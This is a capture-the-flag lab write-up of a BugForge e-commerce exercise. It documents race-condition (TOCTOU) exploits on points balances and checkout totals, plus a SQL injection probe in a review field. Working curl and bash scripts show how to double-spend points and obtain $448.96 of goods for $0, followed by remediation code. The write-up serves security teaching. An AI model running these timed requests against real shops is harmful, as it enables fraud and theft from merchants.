---
layout: default
title: "Cafe Club (Race Condition — TOCTOU) - BugForge"
---

[← Back](./)

# BugForge - Cafe Club Lab Writeup

<div class="meta">
  <span><strong>Date:</strong> 2026-03-22</span>
  <span><strong>Difficulty:</strong> Easy</span>
  <span><strong>Platform:</strong> BugForge</span>
</div>

---

## Executive Summary

**Overall Risk Rating:** 🔴 Critical

**Key Findings:**
1. Race Condition — Cart/Checkout TOCTOU (Critical) — CWE-367
2. Race Condition — Points Balance TOCTOU (High) — CWE-367
3. SQL Injection — Review Rating INSERT (Low) — CWE-89

**Business Impact:** An attacker can obtain unlimited merchandise at zero cost by exploiting a race condition between cart modification and checkout total calculation. Points balance races allow infinite loyalty point accumulation.

---

## Objective
Find the flag in the Cafe Club e-commerce application.

## Initial Access
```bash
# Target Application
URL: https://lab-1774194105236-5gtry4.labs-app.bugforge.io

# Credentials
# Registered via POST /api/register
Username: haxor
Auth: JWT HS256 Bearer token (no expiry)
JWT payload: {"id":5,"username":"haxor","iat":1774194129}
```

## Key Findings
### Critical & High-Risk Vulnerabilities
1. **Race Condition — Cart/Checkout TOCTOU (Critical)** — CWE-367. Checkout calculates total from cart snapshot but doesn't lock the cart. Items added during the ~1s processing window are included in the order at the stale total.
2. **Race Condition — Points Balance TOCTOU (High)** — CWE-367. Concurrent checkouts read the same points balance before any deduction, allowing the same points to be spent N times.
3. **SQL Injection — Review Rating INSERT (Low)** — CWE-89. The `rating` field is interpolated into an INSERT query. `parseInt` validation is insufficient — the full string reaches the DB.

**CVSS v3.1 Score for Cart/Checkout TOCTOU:** **9.1 (Critical)**

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | Low |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality | None |
| Integrity | High |
| Availability | High |

## Enumeration Summary
### Application Analysis

**Tech Stack:**
- Backend: Express.js (X-Powered-By header)
- Frontend: React SPA (static/js/main.f72d2718.js)
- Database: SQLite (inferred from integer IDs, error behavior)
- Auth: JWT HS256, Bearer token, no expiry

**Target Endpoints Discovered:**

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/cart` | GET, POST | View/add cart items |
| `/api/checkout` | POST | Process order with points/gift card/credit card |
| `/api/products` | GET | List 16 products ($8.99-$299.99) |
| `/api/giftcards` | GET | List gift cards and balance |
| `/api/giftcards/redeem` | POST | Redeem gift card code |
| `/api/profile` | GET, PUT | User profile with points balance |
| `/api/products/:id/reviews` | POST | Submit product reviews |

**Business Logic:**
- Points system: Earn floor(total) points per order. 1 point = $0.01 discount.
- Gift cards: Fixed $25 denominations, CAFE-XXXX-XXXX-XXXX format.
- Checkout flow: Cart total → subtract points → subtract gift card → charge card.

## Attack Chain Visualization
```
┌─────────────────────┐
│   1. Reconnaissance │
│   Map 17 API        │
│   endpoints from    │
│   JS bundle         │
└────────┬────────────┘
         │
         ▼
┌─────────────────────┐
│   2. Test Business  │
│   Logic Controls    │
│   Mass assignment,  │
│   IDOR, gift cards  │
│   → all validated   │
└────────┬────────────┘
         │
         ▼
┌─────────────────────┐
│   3. Points Race    │
│   Concurrent        │
│   checkouts read    │
│   same balance      │
│   8 pts → 3500+ pts │
└────────┬────────────┘
         │
         ▼
┌─────────────────────────────────────────┐
│   4. Cart/Checkout TOCTOU               │
│                                         │
│   t=0ms   Add Coffee Filters ($8.99)    │
│   t=50ms  Fire checkout (total=$8.99)   │
│   t=200ms Add Espresso Machine ($299.99)│
│           Add Coffee Grinder ($89.99)   │
│           Add Milk Frother ($49.99)     │
│   t=2100ms Checkout completes           │
│           Order has ALL 4 items         │
│           Total charged: $0             │
└────────┬────────────────────────────────┘
         │
         ▼
┌─────────────────────┐
│   5. Flag Captured  │
│   promotional_code  │
│   returned in       │
│   checkout response │
└─────────────────────┘
```

**Attack Path Summary:**
1. Extract all API endpoints from React JS bundle
2. Test business logic controls — all standard vectors properly validated
3. Discover points balance TOCTOU via concurrent checkouts
4. Farm points: 15 concurrent Espresso Machine checkouts from 8 points → 3500+ points
5. Exploit cart/checkout TOCTOU: add cheap item, fire checkout, add expensive items during processing window
6. Flag returned as `promotional_code` when order value exceeds amount paid

---

## Exploitation Path

### Step 1: Reconnaissance — API Endpoint Mapping

Extracted all 17 API endpoints from the React JS bundle (`static/js/main.f72d2718.js`). Identified the full e-commerce flow: product catalog, cart management, checkout with points/gift cards/credit card, user profiles, and reviews.

### Step 2: Business Logic Testing (Dead Ends)

Systematically tested standard e-commerce attack vectors:
- **Mass assignment (profile PUT):** Server filters writes — only `full_name`, `address`, `phone`, `email` updatable. Points/role ignored.
- **Gift card manipulation:** Negative, 0, 0.01, 999999 amounts all rejected. Fixed denominations only.
- **Price injection:** Extra fields (`price`, `total`) in cart/checkout ignored. Server calculates from DB.
- **IDOR on orders:** Filtered by `user_id` from JWT.
- **Hidden endpoints:** `/api/admin`, `/api/flag`, `/api/debug` — all return SPA HTML fallback.

All standard vectors properly validated.

### Step 3: SQL Injection Discovery

Found injectable `rating` field in POST `/api/products/:id/reviews`:

```http
POST /api/products/1/reviews HTTP/2
Content-Type: application/json
Authorization: Bearer <jwt>

{"rating": "5 OR 1=1", "comment": "test"}
```

`parseInt("5 OR 1=1")` returns 5 (passes 1-5 validation), but the full string reaches the INSERT query. 500 "Database error" response. INSERT-only context, no stacked queries, no data extraction. Low impact but confirms unsafe query construction.

### Step 4: Points Balance Race Condition

Tested concurrent checkout requests — confirmed TOCTOU on points balance:

```bash
# 3 concurrent checkouts from a 16-point balance
# Each reads balance=16, passes points_to_use<=16 check
# All 3 succeed — 48 points spent from 16-point balance
for i in {1..3}; do
  curl -s -X POST "$HOST/api/checkout" \
    -H "Authorization: $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"points_to_use":16,"use_gift_card":false,"card_number":"4444 4444 4444 4444","card_expiry":"12/25","card_cvc":"123"}' &
done
wait
```

Scaled to 15 concurrent Espresso Machine ($299.99) checkouts from 8 points, each earning `floor(299.99) = 299` points. Accumulated 3500+ points.

### Step 5: Cart/Checkout TOCTOU — The Kill Shot

Key insight: the checkout endpoint has a ~1s processing window. Items added to the cart during this window are included in the order but not in the total calculation.

```bash
TOKEN="Bearer <jwt>"
HOST="https://lab-1774194105236-5gtry4.labs-app.bugforge.io"

# 1. Add cheap item to cart
curl -s -X POST "$HOST/api/cart" \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{"product_id":14,"quantity":1}'

# 2. Fire checkout (calculates total = $8.99)
curl -s -X POST "$HOST/api/checkout" \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{"points_to_use":899,"use_gift_card":false,"card_number":"4444 4444 4444 4444","card_expiry":"12/25","card_cvc":"123"}' &

# 3. 150ms later, add expensive items
sleep 0.15
curl -s -X POST "$HOST/api/cart" \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{"product_id":9,"quantity":1}' &   # Espresso Machine $299.99
curl -s -X POST "$HOST/api/cart" \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{"product_id":10,"quantity":1}' &  # Coffee Grinder $89.99
curl -s -X POST "$HOST/api/cart" \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{"product_id":11,"quantity":1}' &  # Milk Frother $49.99
wait
```

Checkout response:
```json
{
  "message": "Order placed successfully",
  "order_id": 54,
  "total": 0,
  "gift_card_used": 0,
  "points_used": 899,
  "points_earned": 0,
  "new_points_balance": 1537,
  "promotional_code": "bug{VBxyJ5hX4y3vMPA7RYNQnAUVfPgahmCC}"
}
```

Order #54 contained all 4 items ($448.96 total value) charged at $0. The 899 points covered the stale $8.99 total. The flag was returned as `promotional_code` because the order value massively exceeded the amount paid.

---

## Flag / Objective Achieved

✅ **Flag:** `bug{VBxyJ5hX4y3vMPA7RYNQnAUVfPgahmCC}`

- Items ordered: Espresso Machine ($299.99), Coffee Grinder ($89.99), Milk Frother ($49.99), Coffee Filters ($8.99)
- Total value: $448.96
- Amount charged: $0

---

## Key Learnings

- **TOCTOU in e-commerce:** Checkout flows that read cart contents and calculate totals without locking the cart are vulnerable to race conditions. The total must be calculated atomically with order creation.
- **Race conditions chain together:** The points balance race enabled the cart/checkout race by providing the farmed points needed to cover the cheap item's cost.
- **Business logic > injection:** Extensive SQLi testing found only a low-impact INSERT injection. The critical vulnerability was pure business logic — no traditional web vuln class.
- **JS bundle is a goldmine:** All 17 API endpoints extracted from the React bundle before any testing began.
- **Timing is everything:** The 150ms delay between checkout and cart additions was crucial. Too early = checkout hasn't started; too late = order already created.

---

## Tools Used
- **curl** — API endpoint testing, race condition exploitation
- **Browser DevTools** — JS bundle analysis, API endpoint extraction
- **Bash (background jobs + sleep)** — Race condition timing orchestration
- **jq** — JSON response parsing

---

## Remediation

### 1. Cart/Checkout TOCTOU Race Condition (CVSS: 9.1 - Critical)
**Issue:** Checkout calculates total from cart contents at the start of processing but doesn't lock the cart. Items added during the ~1s processing window are included in the order at the stale total.
**CWE Reference:** CWE-367 — Time-of-check Time-of-use (TOCTOU) Race Condition

**Fix:**
```javascript
// BEFORE (Vulnerable)
app.post('/api/checkout', async (req, res) => {
  const cart = await getCart(req.user.id);
  const total = calculateTotal(cart);
  // ... long processing (payment, validation) ...
  const order = await createOrder(req.user.id, cart, total);
  // Cart items added between getCart() and createOrder() are included
  // but not reflected in total
});

// AFTER (Secure)
app.post('/api/checkout', async (req, res) => {
  await db.run('BEGIN EXCLUSIVE TRANSACTION');
  try {
    const cart = await getCart(req.user.id);
    const total = calculateTotal(cart);
    await clearCart(req.user.id);
    const order = await createOrder(req.user.id, cart, total);
    await db.run('COMMIT');
  } catch (err) {
    await db.run('ROLLBACK');
    throw err;
  }
});
```

### 2. Points Balance TOCTOU Race Condition (CVSS: 7.5 - High)
**Issue:** Multiple concurrent checkout requests read the same points balance before any deduction, allowing the same points to be spent N times.
**CWE Reference:** CWE-367 — Time-of-check Time-of-use (TOCTOU) Race Condition

**Fix:**
```sql
-- BEFORE (Vulnerable): Read then update in separate operations
SELECT points FROM users WHERE id = ?;
-- ... validate points_to_use <= points ...
UPDATE users SET points = points - ? WHERE id = ?;

-- AFTER (Secure): Atomic check-and-deduct
UPDATE users SET points = points - ?
WHERE id = ? AND points >= ?;
-- Check affected rows — 0 means insufficient balance
```

### 3. SQL Injection — Review Rating (CVSS: 3.7 - Low)
**Issue:** The `rating` field is interpolated into an INSERT query after `parseInt` validation. The raw string reaches the database.
**CWE Reference:** CWE-89 — SQL Injection

**Fix:**
```javascript
// BEFORE (Vulnerable)
const query = `INSERT INTO reviews (product_id, user_id, rating, comment)
               VALUES (${productId}, ${userId}, ${rating}, '${comment}')`;

// AFTER (Secure)
const query = `INSERT INTO reviews (product_id, user_id, rating, comment)
               VALUES (?, ?, ?, ?)`;
db.run(query, [productId, userId, parseInt(rating), comment]);
```

---

## Failed Attempts

### Approach 1: Mass Assignment on Profile
```http
PUT /api/profile HTTP/2
Content-Type: application/json
Authorization: Bearer <jwt>

{"points": 99999, "role": "admin", "full_name": "test"}
```
**Result:** Failed — Server filters writable fields. Only `full_name`, `address`, `phone`, `email` accepted. Points and role changes silently ignored.

### Approach 2: Gift Card Amount Manipulation
```http
POST /api/giftcards/purchase HTTP/2
Content-Type: application/json
Authorization: Bearer <jwt>

{"amount": -25, "card_number": "4444 4444 4444 4444", "card_expiry": "12/25", "card_cvc": "123"}
```
**Result:** Failed — "Invalid gift card amount". All non-standard amounts (negative, 0, 0.01, 999999) rejected. Fixed denominations only.

### Approach 3: Price/Total Injection at Checkout
```http
POST /api/checkout HTTP/2
Content-Type: application/json
Authorization: Bearer <jwt>

{"points_to_use": 0, "total": 0, "price": 0, "use_gift_card": false, ...}
```
**Result:** Failed — Extra fields ignored. Server calculates total from database product prices.

### Approach 4: Hidden Endpoints
```bash
for path in admin users flag config debug; do
  curl -s "$HOST/api/$path" -H "Authorization: $TOKEN"
done
```
**Result:** Failed — All return SPA HTML fallback (React catch-all route). Endpoints don't exist on the backend.

---

## OWASP Top 10 Coverage
- **A04:2021** — Insecure Design (checkout flow lacks race condition protections; cart not locked during processing)
- **A03:2021** — Injection (SQL injection in review rating field, INSERT-only context)
- **A08:2021** — Software and Data Integrity Failures (order total calculated from stale cart state)

---

## References

**Race Condition Resources:**
- [CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition](https://cwe.mitre.org/data/definitions/367.html)
- [OWASP Race Condition](https://owasp.org/www-community/vulnerabilities/Race_condition)
- [PortSwigger: Race Conditions](https://portswigger.net/web-security/race-conditions)

**SQL Injection Resources:**
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

---

**Tags:** `#race-condition` `#TOCTOU` `#e-commerce` `#business-logic` `#SQLi` `#BugForge`
